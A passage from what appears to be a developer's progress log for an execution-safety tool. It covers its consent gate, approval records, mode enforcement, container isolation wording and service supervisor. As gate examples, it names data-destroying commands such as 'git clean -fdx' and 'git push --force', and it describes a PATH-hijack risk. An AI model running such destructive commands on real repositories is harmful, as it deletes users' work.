  binary that **spawns nested runs of itself** writes those runs' output to the
  same inherited stdout, so their `test <name> ... ok` lines and their
  `test result:` lines arrive inside the parent binary's block with no `Running`
  header of their own. The Windows log of run `34938974624` shows it directly:
  under `Running tests\store_concurrency.rs (…)` there is `running 7 tests`, then
  `test child_writer ... ignored, spawned by the parent tests, not run on its
  own`, then **six** `running 1 test` banners followed by four `... ok` lines at
  once — the nested runs are concurrent, and their results land in the parent's
  block. `store_concurrency.rs` is the deliberate case; `tests/process_runner.rs`
  is the same shape for a different reason, reported `37` with 29 `... ok` lines
  attributable to it, because spawning processes is what that file tests. So
  "count the `... ok` lines under this binary's `Running` header and compare with
  its reported `passed`" has **no single value** for those binaries, and a check
  built on it reports agreement without having compared anything. **What is sound
  is the aggregate form, and it is established: `(binary, name)` pairs equal the
  reported parent sum exactly on all three platforms** — 1142 / 1143 / 1144 —
  which is what the per-binary invariant would have to sum to if it existed.
  Recorded at this length rather than deleted, because the failure was *silence*:
  a comparison of a quantity that cannot be computed, reporting no mismatch, in a
  file whose whole method is to refuse exactly that.

- **`P3-T004`'s acceptance note headlines `1126` for Windows where the parent sum
  is `1116`, and that note cannot be rewritten.** Re-reading run `34935781639`
  this session: Windows `lines=44 parents=34 children=10 sum_all=1126
  sum_parents=1116`, macOS `1117`, Ubuntu `1118`. The note's "+38, matching
  `P3-T003`'s `1078` exactly" is right about the arithmetic and wrong about which
  of the two numbers it was quoting — **`1078 + 38 = 1116`**, and `1126` is that
  plus the ten re-run lines. No force push and no history rewrite are available or
  wanted, so the correction lives here and in the `P3-T005` acceptance note.
  **And the same mistake was in `c940300`'s own message, in two smaller places**:
  "(`execution.rs`, +24)" and "(`vocabulary.rs`, +27)" are the sizes of the
  *methods* while the files are `+54` and `+67`, and "names no `ProcessRequest`"
  is wrong as written — `consent.rs` names it once, at line 234, in a doc comment
  on `PlannedCommand::new` saying why it does not take one. The `numstat` is the
  anchor for the first two and `grep -n` for the third.

- **What is not established, stated in the module rather than left to be
  inferred.** **Nothing about a command that has its own approval**: `NeedsConsent`
  is a decision, and there is no consent record, no prompt and no host-execution
  authorisation in this file — `HostConsent` exists in the domain and nothing
  constructs one. **Nothing about what a command actually does when it runs**,
  which is the classifier's own caveat and stays true here. **Nothing about the
  TOCTOU window** between planning a command line and running it: the file it
  names can be replaced in between. **Not a check that any check plan is
  complete**: `exclude_refused_from` moves what was refused, and a plan that never
  held a check is a caller's bug reported back rather than a defect found here.
  **Nothing about `WriteProject`**: a command that merely writes inside the
  project is still outside this vocabulary.

- **No spawn site was added, and that is the load-bearing fact for the support
  ceiling.** `consent.rs` plans commands and builds none, so `THE_SPAWN_SITES` is
  still three entries and `nothing_outside_the_runner_names_a_process_request`
  passes. `sure_core::support`'s level-C ceiling is justified by *no project code
  running*, and the module that decides what is allowed to run still cannot run
  anything. `spawn_sites.rs`'s own module doc says it is meant to fail the day
  `P3-T005` wires the runner up; that it did not is a fact the check established
  rather than a claim this note makes.

## P3-T006 — the gate that decides which commands may run, and the record that outlives the process that made it

- **The approval record had to gain a field, and without it the acceptance
  sentence is vacuous.** `ApprovedCommand` carried `program`, `args`,
  `working_directory` and `check` — four ways of saying *what would run* — and
  nothing about *what SURE told the user it was*. "Only approved command categories
  execute" cannot be checked against a record that does not say which categories
  were approved, so `effects: CommandEffects` is new. The reason it is not
  ceremony: `safety::classify` is deterministic on `(program, arguments)`, so
  within one build the recorded reading and the live one always agree, and a check
  comparing them compares a value with itself. What makes it a check is that **an
  approval outlives the build that wrote it** — it is written to disk, it is read
  back by a later SURE, and *may this run* is then put to a classifier that may
  since have learned something. `git clean` approved as destruction and later read
  as destruction is the same answer; the same command line approved as *static* and
  now read as destruction is not, and a record without categories sails past it.
  `Refusal::CategoryNotApproved` is that case, and it is where the first acceptance
  sentence is enforced rather than asserted.

- **`CommandEffects` gained a `Deserialize`, and it is deliberately *not*
  `of`.** The two doors point their cautious direction oppositely.
  `of(&[])` answers `anything()`, because a rule that named no category has said
  nothing about a command and for a *classification* silence must land on the
  dangerous side. A value arriving over a wire is not a classification — it is a
  claim about something that already happened — and for the set of categories a
  user approved, the cautious direction is the other one: reading an empty list as
  `anything` would turn *this approval covers nothing* into *this approval covers
  everything*, which is the worst possible reading of the exact field the gate
  depends on. So the impl refuses an empty list outright, and everything else
  routes through `canonical` so no non-canonical value can be read back. This is
  the one place in the workspace where `Deserialize` is hand-written, and it is the
  reason the record can be trusted without re-validating it at every use.

- **`covers` is a subset test, and one direction of it is a boundary rather than a
  bug.** A command that still falls inside what was approved is covered; one that
  has gained a category nobody agreed to is not. `Static` is **not** a subset of
  `Install, Network` — it is a different reading — so `covers` answers `false` for
  that pair, and `execution.rs`'s test says so rather than the opposite. **My first
  version of that test asserted the opposite and the suite caught it**: it claimed a
  command that narrowed to `static_only` was still covered, which is not what
  subset means. The case cannot reach the gate either way — a static-only command
  is permitted by `Permission::Inspect` in `standing_for`'s first branch, before
  any consent is consulted — so the question `covers` answers is only ever asked
  about a command that needs consent. No special case was added for `Static`: a
  rule with no producer of the case it handles would be vocabulary rather than
  behaviour.

- **The record is a `RecordKind`, not an eighth `DocumentKind`, and it is the
  third schema-less kind.** A `DocumentKind` would put SURE's own audit trail into
  the integration protocol, which is a contract with harnesses rather than a
  place for this; `docs/architecture/STORAGE_AND_DATA_PATHS.md` already decided
  the store is where records about a project state live, and
  `docs/architecture/PROTOCOL.md`'s gap about document versions makes the protocol
  registry the more expensive of the two rooms to add a bed to. So
  `RecordKind::Approval` joins `Recording` as the second kind with no schema — and
  takes the **opposite** history rule. `Recording` is excluded from
  `HistoryFilter::default` because it is private captured material the user opted
  into; an approval is a statement about what SURE was allowed to do, and a kind
  the default filter excluded would make the audit trail invisible to the command a
  user would look in. It is still deletable, because `docs/security/PRIVACY.md`
  gives the user the whole local history and not a part of it. The drift guard that
  said `is_recording()` is now `is_recording() || is_approval()` **and asserts the
  count is exactly 2**, so a fourth schema-less kind cannot arrive quietly — which
  is what it is for: it broke on this change and was rewritten having been read.

- **No after-the-fact vocabulary was invented, and `ADR 0009`'s sentence is
  satisfied by two timestamps instead.** The ADR says *"An approval made after the
  fact is recorded as such rather than presented as pre-authorisation."* The
  tempting move was an `ApprovalOrder` enum with a `PreAuthorised`/`AfterTheFact`
  pair. It was not taken: `docs/architecture/FROZEN_SEMANTICS.md`'s rule is that a
  variant the code cannot produce is not vocabulary but an invitation to produce it
  wrongly, and nothing in this release can produce an after-the-fact approval —
  there is no repair loop yet that would need one. What the record carries instead
  is `granted_at`, supplied by the caller in the user's own terms, and
  `RecordedApproval::written_at_ms`, which is the store's clock. They are kept
  apart rather than reconciled, and `written_at_ms`'s doc says why: an audit that
  found them disagreeing has found something worth looking at. When a task can
  actually take an approval after the fact, that task adds the vocabulary and this
  note is the reason it was not added early.

- **`NotCheckedReason::UserDeclined` has its first producer, and only one of the
  three ways to be refused is entitled to it.** `crate::consent` recorded why it
  did not use the word — *"nothing has been declined, and a report that said so
  would be inventing an event"* — and named this task as the prompt that can be
  declined. The gate is that prompt: a command that was in the
  `ConsentRequest` and is not in the `HostConsent` was shown and not approved, and
  `Refusal::Declined` is what it becomes. The two neighbours are deliberately not
  the same word. `Refusal::CannotBeShown` is a command that needed an answer and
  could not be rendered at all, so nobody was asked; `Refusal::NotPermitted`
  carries the plan's own reason, because a missing permission is not a question.
  Both report `ExecutionNotAuthorized`, and a test asserts that a destructive
  command under inspect-only is refused under the plan's reason rather than under
  `UserDeclined` — **the user was never asked, so nothing was declined.**

- **The gate keys on the plan index, not the check id, because one check can plan
  two commands.** `npm ci` and then `npm test` are one check, and the second is not
  approved by the first one's answer. So `RequestedCommand` stores its index into
  `plan.commands()`, `standing_for` matches an `ApprovedCommand` on
  `(program, args)` rather than taking the first approval under the check, and
  `Refusal::NotTheApprovedCommand` is what a near-miss produces. Matching on the
  check id alone would have been the classic false green: a `git clean -fdx`
  approval admitting a `git clean -fd` plan because they share a check.

- **Two structural findings about the prompt, both of which are facts about the
  plan rather than rules of the new type.** First, **the two `WhyAsked` reasons
  cannot co-occur in one request**: `consent::decide_for` asks about the
  ungrantable category *before* the mode, so a destructive command under a mode
  that runs nothing is `Denied` rather than `NeedsConsent` and never reaches a
  prompt — a test pins that, and pins that its reason is not `UserDeclined`.
  Second, **under host-confirmed with every permission granted, the prompt surface
  is narrow**: `npm test` and `cargo add` are both *allowed* and are not questions
  at all, so the only commands that reach a user are the destructive ones and the
  ones SURE could not read. My first version of the category test used `cargo add`
  and failed for exactly this reason — it is a finding about how little of a plan
  a user is asked about, and it is recorded rather than quietly worked around by
  changing the command.

- **A command SURE cannot render is unaskable *and* unrecordable, so it is
  structurally unapprovable — and it is reported rather than dropped.**
  `ConsentRequest::of` puts such a command in `unrenderable` with its place in the
  plan, `explain` prints that it could not be shown, and the gate refuses it with
  `CannotBeShown`. A question that quietly lost a command would be a prompt the
  user answered without being asked about all of it, which is the same defect as a
  report that quietly loses a check. This is the second consequence of
  `P3-T004`'s rule that nothing SURE could not read is ever allowed to run: it
  cannot even be consented to, and that falls out of the types rather than being
  enforced — `ApprovedCommand`'s fields are `String`, so a non-text command line
  has nowhere to be recorded.

- **No spawn site was added, and the support ceiling still holds.** This module
  builds the gate and the record; it does not open the gate. There is still no
  caller of `sure_core::process::run`, `THE_SPAWN_SITES` is still three entries,
  and `nothing_outside_the_runner_names_a_process_request` passes. The module doc
  says so, and says which two places change in the same commit the day something
  runs: `spawn_sites.rs` and `sure_core::support`'s level-C ceiling, which is
  justified by *no project code running*. Stating the pair here is the point —
  they are the two files that would otherwise go on claiming nothing executes.

- **What is not established.** **Nothing has been run**, and `Authorisation::admitted`
  is not a claim that anything has; it is the only door to a command a caller could
  start, and no caller exists. **Nothing about what an approved command will do** —
  approving a command line is not approving the code behind it. **Nothing about
  whether the user understood the question**; what is recorded is what was shown
  and what was answered, and the two are the same value by construction. **Nothing
  about a prompt having been displayed**: `ConsentRequest` is by definition what
  SURE shows, and a caller that builds one and never displays it has a bug this
  module cannot see — `Refusal::Declined` would then be reporting a decline that
  never happened. **Not a check that a plan is complete**: the gate decides about
  the commands a plan holds and says nothing about one that was never planned.

- **`d58532a`'s own message says `approval.rs` is "1490 lines", and it is `1777`,
  and that message cannot be rewritten.** The number was carried from a note taken
  while the file was still growing and was never re-measured against the tree being
  committed — which is the same failure as `c940300`'s method-size figures two
  tasks ago, in the same place: **a size quoted from memory at the moment the
  message is written, when the anchor is one command away.** The anchors are
  `git show --numstat d58532a` (`1777 0`) and `wc -l` on the committed blob, and
  the other counts in that message were re-measured against the committed tree
  before the handoff section was written: `+30` in both directions, the six
  per-file numbers, `0 failed` and `9 ignored` over 44 result lines. The correction
  lives here and in the acceptance note. **The general form is worth stating once**:
  a commit message is the one artefact in this repository that can never be fixed,
  so every number in one should be pasted from a command rather than typed from
  what the author believes the file's size to be.

## P3-T007 — the mode applied to a plan, and a mutation that found the tests were the thin part

- **`inspect_only` has been true of this build by accident, and this is the task
  that stops it being true that way.** Nothing in this repository launches a
  project process: `tests/spawn_sites.rs` counts three places that build a
  `Command`, all inside the runner's own machinery, and `support::CEILING` is
  justified by *no project code running*. **That is a fact about the build, not a
  property of the mode** — and the census test says in its own documentation that
  it is written to fail the day a check is wired to the runner. `enforce.rs` is
  what has to exist before that day: it turns "nothing runs, because there is
  nothing to run it" into "nothing runs, because the plan says so", so that the
  runner has a value to consult rather than an absence to fall into. The
  distinction matters because the two fail differently — an absent runner fails
  loudly, and a mode that is not consulted fails silently.

- **The classification is made before the refusal, and the order is the
  decision.** A check is put in `static_checks` or `dynamic_checks` from what its
  commands *would* use, and only then removed if one of them will not run. So a
  check that would run the project's code in a mode that runs nothing lands in
  `dynamic_checks` and is immediately excluded from it. Doing it the other way
  round — deciding the refusal first — would leave a report unable to tell "this
  check reads files" from "this check would have run your code and the mode
  stopped it", and the second is the sentence a user most needs to see. The
  consequence to know before reading a plan: **a check excluded under
  `inspect_only` is still classified as a dynamic one by what it would have
  needed**, which is why the classification is about effects and not about the
  decision.

- **A check is a unit, and the rule costs a runnable command.** A check with one
  allowed command and one refused command does not run *at all* — the allowed
  half is not admitted. A verdict for half a check is a verdict for a check that
  did not happen, which is the outcome this repository is built to avoid, and
  running the allowed half would be work done for a result no report will read.
  This is a real cost: `git status` inside a check whose `npm test` was refused
  does not run. The alternative is worse, and the test that holds it is
  `a_check_with_one_allowed_command_and_one_refused_one_is_stopped_rather_than_half_run`.

- **`NeedsConsent` becomes a stop, because there is nobody here to ask.**
  `decide_for`'s third rule produces `NeedsConsent` exactly when the mode is too
  cautious and a user could say yes; `enforce.rs` has no prompt, no user and no
  way to wait, so it stops such a command under the reason it already carries
  rather than inventing one. **The reason is `ExecutionNotAuthorized` and
  deliberately not `UserDeclined`** — nobody declined anything, and
  `P3-T006` already established that only a refusal entitled to that word may use
  it. The direction is the cautious one, and the alternative — carrying the check
  forward as one that might run — would put a check in a plan that nothing will
  ever run. The case that makes it concrete: **`git push --force` is `NeedsConsent`
  in `host_confirmed` with every permission granted**, because `Destructive` has
  no permission to grant, so even a maximally permissive user gets a stop rather
  than a green.

- **`unscheduled()`: the one path by which a plan could have run something it
  never listed.** The permission plan and the check schedule are built from two
  different places and can disagree. A command planned against a check that was
  not scheduled is **not admitted** — running it would be work for a check that
  is not in the plan, and so for a result no report will ever read — and the check
  id is reported rather than absorbed, which is the same shape as
  `PermissionPlan::exclude_refused_from`'s `not_in_the_plan`. The second
  acceptance sentence is about dynamic checks remaining not-run, and a command
  that runs is one that ran whatever the plan's lists say; this was the only path
  by which a plan could otherwise have run something it never listed.

- **`consent::runs_project_code` was made `pub(crate)` rather than copied, and a
  third caller would be one too many.** The rule that decides a command needs
  asking (the mode rule) and the rule that decides a check is dynamic have to be
  about the same set of categories; a copy in `enforce.rs` is where the two would
  drift, and the drift would be invisible — a check classified static while its
  command was being stopped for running project code. It is private-until-now
  rather than public API: the visibility change is the minimum that lets one
  module call it.

- **`CheckPlan::exclude`'s return value is the latch that keeps the two lists in
  step, and that is why it is read rather than ignored.** `stopped` is a
  `Vec<CheckResult>` and `CheckPlan::excluded` is a `Vec<NotCheckedReason>` with no
  ids, so the only thing tying a reason to a check is that both were pushed in the
  same pass. `if checks.exclude(id, reason) { stopped.push(result) }` makes that
  structural: the reason is appended inside `exclude` only when it returns `true`,
  and the result is appended only when it returns `true`, so the two vectors cannot
  get out of step — no rule to remember, and nothing to test except that the latch
  is being used. `the_stopped_results_and_the_excluded_reasons_are_in_step` reads
  them back over every mode and every permission set.

- **A batch file is admitted by no mode under no grant, and the owner's question
  is still open.** `safety::classify` answers before the table is reached for any
  `.cmd`/`.bat` name, with `anything()` — every category but `Static`,
  **`Destructive` included**. `Destructive` has no permission, so `decide_for`'s
  rule 2 answers for every batch file before the grants are consulted, and the
  only two answers it can give are `Denied` and `NeedsConsent`. Neither is
  `Allowed`, so **no permission set reaches a batch file in any mode**, and this
  module stops either answer. **Whether a caller may ever *name* a batch file is
  left open** — it is recorded in `process/mod.rs` (*"Whether a batch file may be
  named is not decided here"*) and in `process/error.rs`, and the handoff names it
  as `P3-T004`'s classification, `P3-T005`'s permission and this task's
  enforcement. **This is the third of those to meet it and the third to leave it
  open**, which is what the handoff predicted. What is settled is the half that
  does not depend on the owner's answer: an enforcement built from this module does
  not admit one, whatever a caller is allowed to name.

- **A mutation found that the rule filling `CheckPlan`'s two lists was held by one
  unrelated assertion.** Four mutations were run against the module. Replacing the
  static/dynamic branch with an unconditional push to `static_checks` — which
  would make every report claim nothing is launched — broke **exactly one test**,
  and that test was asserting `dynamic_checks.len() == 1` for the unrelated
  purpose of showing that a granted install becomes a dynamic check rather than
  disappearing. **A field whose contract hangs on one unrelated assertion is a
  field nothing is holding.** `a_check_is_dynamic_exactly_when_one_of_its_commands_runs_project_code`
  now reads the rule directly over the whole matrix, with its own non-vacuity
  guard, and the same mutation is caught twice. The other three mutations — a
  stopped check admitted, `admitted` computed from `is_allowed()`, and the
  `unscheduled` rule removed — were caught by 6, 2 and 1 tests respectively. **The
  general lesson is about the non-vacuity guard rather than about this module**:
  the guard added in the first commit counts the effects of *admitted commands*
  and is silent about which list a check went into, so it would have caught a
  mutation that admitted something and not one that merely mislabelled it. Two
  different claims, and only one of them had a test.

- **What is not established.** **Nothing about a process**: this says which
  command lines may be handed to a runner and nothing about what one does when it
  runs — `safety::classify`'s own caveat, unchanged by being consulted here.
  **Nothing about a caller that ignores it**: `Enforcement::admitted` is the only
  door, and that is a rule about the caller, which the type system cannot hold —
  the first check to run project code must take its command lines from there and
  nowhere else, and `spawn_sites.rs` is where that becomes testable. Until then
  this is a gate with no road through it, the same position `approval.rs` is in.
  **Nothing about `WriteProject`**: a command that merely writes inside the project
  is still outside this vocabulary, so "no project code runs" is not the same claim
  as "the project is untouched", and the Git filter refusal in
  `docs/architecture/EXECUTION_SAFETY.md` is what actually covers that. **Not a
  sandbox**: the mode is a promise about what SURE starts, not a boundary around
  what a started process can reach. **Nothing about a check with no commands**: it
  goes to `static_checks` because nothing is launched for it, which is a statement
  about this module and not a promise about whatever performs it.

## P3-T008 — the container adapter, and four places that were calling a container isolated

- **The absence is a shape rather than a message.** `Availability` is
  `Found { runtime, program }` or `Absent`, and there is no third arm, no `Result`
  and no error type. The acceptance sentence is *"Docker/Podman absence is
  nonfatal"*, and a type with no failure to represent is a stronger form of that
  sentence than a convention that says so. The rejected alternative was
  `Result<Runtime, String>` with an ordinary message, and the failure mode of that
  is specific: a `?` in a caller three modules away turns the ordinary case —
  most machines have neither runtime — into an error a user reads as *your setup
  is broken*. `Availability::explain()` carries the meaning instead, and the
  `Absent` arm says what **does** happen rather than only what is missing.

- **`find_in` is shared rather than copied, and the doc says where the line is.**
  `doctor::find_in` became `pub(crate)`, because a second implementation of *what
  SURE would execute* could disagree with `sure doctor` about whether a program is
  installed, and two answers to that question is worse than one answer in the
  wrong module. Two callers is a shared helper. **The doc comment now states that
  a third caller is where it moves into a module of its own**, which is the same
  threshold `consent::runs_project_code` crossed in `P3-T007` — the rule is
  written down where the next person will read it rather than left as precedent.

- **The plan is a value, and the defaults are the safety story.** `Access::ReadOnly`,
  `Network::Off` and `/project` are the three defaults, and each is a test. The
  working directory is never the host's path because the host's path does not
  exist inside a Linux image — a plan that emitted it would produce a container
  that starts and fails somewhere unrelated to the mistake. `with_writable_project()`
  and `with_network(...)` exist so the one widening this plan permits is a line
  somebody wrote and a reviewer can see; **no argument is ever interpolated
  through a shell**, and the image is the last element with the command left to
  the caller, because a plan that named a command would be deciding what to run
  and that is `enforce.rs`'s question.

- **The mount and the network are asymmetric, and the asymmetry is a test rather
  than a comment.** A command's effects **can** answer *does this need a route
  out?* — `Network` is one of the five `CommandClass` categories — so
  `for_command` derives it. **Nothing can answer *may this write inside the
  project?*** — `npm test` writing `target/` is `DynamicHost` and `git status`
  writing nothing is `Static`, and the five categories cannot separate them. So
  `Access` is an argument, the default is read-only, and nothing guesses.
  `the_network_never_widens_the_mount` walks `static_only()`, `anything()` and an
  install-only set past `for_command` and fails if any of them moves the access
  mode, **because the tempting simplification — derive both from effects and
  default the one you cannot derive — is exactly how a guess arrives wearing a
  rule's clothes.** This is the missing-category decision the handoff has carried
  since `P3-T004`, and **`P3-T008` is the first task blocked by it rather than
  merely mentioning it**: the blocked work is named (deriving `Access`) rather
  than left to be rediscovered.

- **A path with `,` or `=` is refused, and there is no fallback on purpose.**
  `--mount` is a comma-separated `key=value` list, so a source path containing
  either character re-splits into fields that are not this plan's; the short
  `-v source:target:ro` form takes the path but cannot carry a Windows path at
  all. **There is no spelling that works**, so the choice is between a refusal and
  a silent wrong mount, and refusing fails closed. A space is **not** an ambiguity
  and is accepted, which a test states — refusing spaces would refuse most Windows
  paths, and that test is what stops the refusal from growing into a rule about
  unusual paths in general.

- **The second acceptance sentence is about prose, so it is checked as prose.**
  *"…and is described as limited isolation, not perfect sandboxing."* Four places
  called this mode **isolated** and stopped: the `Container` variant's doc comment,
  its `plain_description()`, the `container` row in `docs/adr/0009`, and
  `docs/architecture/EXECUTION_SAFETY.md`. None was careless — *isolated* is the
  industry's word for this, which is exactly why a one-time correction would not
  have held. `OVERCLAIMS` (two phrases), `overclaims(sentence, phrase)` and
  `tests/container_isolation_claim.rs` make it a rule over every shipped `.rs`
  under `crates/` and every `.md` under `docs/`. **`progress/` and
  `MASTER_PROMPT.md` are excluded and the exclusion is argued**: those are dated
  records of what was written at a time, and editing them to agree with today
  would be the document half of rewriting history.

- **The consent prompt was rewritten inside a constraint that made it better.**
  The prompt is the one sentence here that reaches somebody who did not go looking
  for it, and `mode_descriptions_are_plain_language` bans *sandbox* in it as jargon
  — so *"not a sandbox"* was not available. It says **"That is limited isolation:
  it narrows what a check can reach, and it is not a separate computer"**, the
  everyday form of *shares the host's kernel* that does not require the reader to
  know what a kernel is. **Two rules that each make sense alone constrained each
  other into a sentence neither alone would have produced**, and that is the useful
  part of the record: the ban is what forced the honest sentence to be plain.

- **The rule made both of its own mistakes and its tests found both.** `overclaims`
  excuses a phrase only inside the clause that contains it, because *"Docker is
  not installed, and the container is an isolated container"* is two claims. **The
  first clause-boundary set was `.` `;` `:` and the newline — and that sentence,
  written into the function's own test as the example of what it must catch,
  passed it.** A comma is where English puts the joint between two independent
  clauses, so the rule read the second clause as part of the first. Adding `,`
  makes the rule **stricter**, so the mistake was in the safe direction, and it was
  still real: the check would have excused the sentence its own documentation named
  as its purpose. **The second was in the ADR correction**, which quoted the old
  wording in order to correct it and was flagged — correctly, because the rule
  cannot tell a quotation from a claim and does not pretend to. The fix names which
  word moved rather than reproducing it. **A rule that read intent could be argued
  with; the cheap checkable version is worth more than the clever one.**

- **A coverage gap found in a borrowed file, measured, and deliberately not
  fixed.** `doctor::find_in` documents that an empty `PATH` entry is skipped rather
  than read as the current directory — on Unix an empty entry **is** the current
  directory, which is where a checked project would keep a `docker` it would like
  SURE to run. **No test holds it.** The nearest test passes an empty *directory*,
  which exercises nothing; the observable difference needs a file in the working
  directory that the platform's `can_be_run` accepts, which on Unix means an
  execute bit no file in the crate root has. Measured rather than reasoned:
  deleting the filter leaves the whole workspace green (45 result lines, 0 failed,
  exit 0, worktree restored and the blob checked afterwards). **The fix belongs to
  `doctor`, whose task is accepted**, and folding an unrelated test into this
  commit would make the change harder to read than the gap is dangerous. What this
  task does instead is stop *repeating* the rule: its own test that claimed to
  cover it was asserting nothing — it created a fake `docker` and then asserted
  only that the current directory had not changed — and was **replaced** by
  `the_first_runtime_in_the_search_order_is_the_one_reported`, which builds a real
  directory with a real `docker.exe` and a real `podman` and asserts which one
  comes back.

- **The mutation harness failed its own first run, in two ways, and both were
  reported.** `mutate3.py` generalises `mutate.py` to any file and any `cargo test`
  filter, so the wording half of the acceptance could be mutated too — three of its
  twelve mutations change a document or a `&'static str` rather than a branch.
  **`text=True` decodes subprocess output with the locale encoding, which is GBK
  here**, so one mutation died inside a reader thread and was reported as *nothing
  at all*; and **the filter was passed as one `argv` element**, so `cargo` rejected
  it and three mutations were reported as survivors of a suite that never started.
  Both are fixed, and the second is fixed **in the reporting as well**: a run with
  no `test result:` line now prints **INCONCLUSIVE** rather than *"this mutation
  survived"*. **That second half is the one that matters**, because printing a
  diagnostic and then contradicting it in the summary is the same shape as the
  `P3-T007` finding one level up. `mutate.py` carries the same latent decode bug
  and did not hit it — its filter and its test names are ASCII — so the `P3-T007`
  record stands unchanged, and saying so is part of the finding.

- **A tool caveat, measured, that nearly produced a wrong number.** The source-level
  `#[test]` count was first taken with `git grep -h '#[test]' -- crates`, which
  reported **1184** — the same figure as the previous commit — for a worktree
  holding **1205**. **`git grep` with no revision reads the index and worktree but
  skips untracked files**, and both new files were untracked at that moment. The
  count in the record is a `grep -rh` over the tree instead. The four earlier
  source-count readings on this branch were taken on committed trees, where
  `git grep` is correct and where this run's own numbers reproduce them — **so the
  caveat corrects a reading rather than a conclusion, and the distinction is
  recorded rather than the earlier figures being quietly re-taken.**

- **Two tool findings, both about a green check and neither about the code.**
  The first is `git grep`'s documented-in-hindsight behaviour (next-but-one
  bullet). The second is that **`taskctl accept` cannot record evidence and cannot
  be re-run**: it reads `--note`, ignores `--evidence`, and refuses a task that is
  already `accepted`, so the acceptance for this task landed with an empty note and
  the real one was written by hand. **A hand-written note is a claim no gate
  checks** — `taskctl validate` reports `state OK: 166 tasks` whatever the note
  says — and this one promptly demonstrated it by carrying a stale mutation count,
  which was corrected in place. **And the edit that wrote it did something worse
  than the stale figure**: made with Python's `json.dump` at its default
  `ensure_ascii=True`, it rewrote every non-ASCII character in
  `progress/state.json` as an escape sequence — 148 em-dashes in other tasks'
  notes — while leaving 2 raw, so the file was neither one form nor the other.
  **It parsed, so every gate passed.** The only symptom was `git diff --stat`
  reading 28 changed lines for a change of four, which is the same signal
  `P3-T001` used to catch a line-ending rewrite: **this class of mistake has no
  symptom except a diff that is larger than the change.** The file was restored
  and the restore is checked by a property rather than by silence —
  `json.dumps(d, indent=2, ensure_ascii=False)` reproduces the committed blob byte
  for byte, so the canonical form is the tool's. `scripts/taskctl.mjs` was checked
  and is not the cause: its `save()` is `JSON.stringify(state, null, 2)`, which
  leaves non-ASCII alone.

- **What is not established.** **Nothing about a container that exists**: no
  process is started, so everything here is a claim about an argument vector and
  not one about Docker's behaviour — whether the runtime accepts these arguments,
  whether the image is present, whether the mount appears, and whether the
  isolation is what the runtime claims are all unverified, and `isolation_claim()`
  is this build's sentence about containers rather than a measurement of one.
  **Nothing about resources**: no `--memory`, `--cpus`, `--pids-limit` or timeout
  appears in the plan, so a check inside a container can still take the whole
  machine, and *limited isolation* is a claim about reach and not about load.
  **Nothing about `Access::ReadWrite`**: the method exists, is tested, and no
  caller receives it by any path other than naming it, and whether any check
  should ever get it is the missing category's question. **Nothing about the plan
  being used**: like `enforce.rs` and `approval.rs`, this module has no caller —
  `P14-T006`, *"Implement execution-trust fixtures"*, is the one dependent the task
  graph records, and its second acceptance sentence, *"Container unavailable path
  is honest."*, **is this task's first sentence arriving later as a fixture**, which
  is the graph agreeing with the type rather than with the prose.

## P3-T009 — the service supervisor, and a door that is a type rather than a rule

- **Policy above, mechanism below, and the split is the whole design.** `service.rs`
  decides *when* something may run and what the caller is told; `process/` decides
  *how*. It is the same split as `consent` and `enforce` against `process`, and the
  consequence is that the supervisor holds no `Command::new` of its own — the census
  in `tests/spawn_sites.rs` is what keeps that a fact rather than an intention.
  `Supervisor::start` takes an `AdmittedCommand<'_>` and **nothing else**: not a
  program name, not an argument list, not a `&str`.

- **The door is a type.** `enforce::AdmittedCommand<'a>` has a private constructor,
  so a caller cannot witness a decision nobody made, and *"a runner must take what
  it launches from `admitted()`"* — a paragraph in `P3-T007` and a rule for callers
  until this task — became something the compiler holds. **The rejected alternative
  was a documented convention plus a test that greps for
  `PermissionPlan::commands()`**, which is the shape `spawn_sites.rs` already uses
  and which was rejected here for a stated reason: a grep holds a rule about
  *text*, and this was a rule about *authority*. `Enforcement::admitted()` remains
  the only producer, and the one place that consumed the iterator item directly was
  rewritten to consume the witness instead.

- **A callback at the last point before the wait, because "started" has to mean one
  thing.** `process::run_when_started` fires the caller's closure after every
  fallible step and after both streams are being read; every `return` above it is a
  run that never began. `Supervisor::start` returns `Ok` only once that callback has
  fired, so **a service reported as running is a process the operating system
  accepted and SURE is reading** — not one that might still be failing to spawn.
  The alternative was for `start` to return immediately and let the caller poll,
  which moves a race into every caller and makes the module's central sentence false
  whenever the spawn fails.

- **`Service::stop` names every field in its destructure, and that is a bug fix
  rather than a style.** `let Service { running, .. } = self;` leaves the un-moved
  `stopper` alive until the end of the function — *after* the wait, and the wait is
  on a run that ends only because `stopper` drops. **Deadlock.** It was proved with
  a `Drop` that prints rather than by reading the code, and the ordering claim in
  the doc comment is now backed by a test that fails when the mutation reverses it
  (`m4`, caught in 30 s by the abandoned-file deadline rather than by hanging
  forever). `Stopper` is a separate type for the same reason: `Service::stop` takes
  `self` and must move the `JoinHandle` out, and a type with a `Drop` cannot have
  its fields moved out.

- **A stop that arrives before the deadline is a cancellation, not a timeout, and
  the first version of the test asserted the opposite.** The deadline test asserted
  `TimedOut` and got `Cancelled { stopped: WholeTree }`, because `stop` asks for the
  cancellation *before* it waits. The test now waits for `has_finished()` (bounded
  by its own patience) and then stops, and asserts `outcome.took() >= BRIEF`. The
  word *already* in the documentation of `stop` is load-bearing.

- **`CancelledBeforeStart` was planned, written into the design, and dropped as
  unreachable.** The `Cancellation` is created inside `start`, so there is no handle
  a caller could cancel through before a start, and the variant would have had a
  match arm nothing could reach. **The arm that remains impossible is kept and
  reported rather than asserted away**: a run that ends without ever having reported
  that it was under way is `NotFollowed` carrying the termination, not a discarded
  outcome. That arm was then **reached on purpose** by mutation `m2`, which deletes
  the single `started()` call — so the documented-unreachable path is reachable, and
  what it produces is the message its own comment predicted:
  `NotFollowed { message: "the run ended as TimedOut { stopped: WholeTree } without
  ever reporting that it was under way" }`.

- **There is no `is_ready`, and the word does not appear in the module's
  vocabulary.** Whether a service is *listening* and whether it *answers* are a
  probe's questions, which is `P3-T010`; `start` returning `Ok` means the spawn was
  accepted and SURE is reading the process, and nothing more. **Reporting readiness
  from the fact that a process exists is the false green this product is built
  against**, so the fact is named at the type level rather than left to prose: a
  caller that wants readiness has to go and ask, and there is nothing here to
  mistake for an answer. A service that comes up and immediately dies is `start`
  returning `Ok` followed by `has_finished()` being true.

- **`Limits::timeout` is the whole-life budget of the service, not a startup
  timeout.** A service still running when it expires is stopped and comes back
  `TimedOut`, whether it never came up or came up and was working. Stated in the
  module doc rather than left to be inferred from behaviour, because the two
  readings differ exactly in the case a caller is most likely to be in.

- **Two gaps are stated as gaps rather than decided quietly.** **No environment
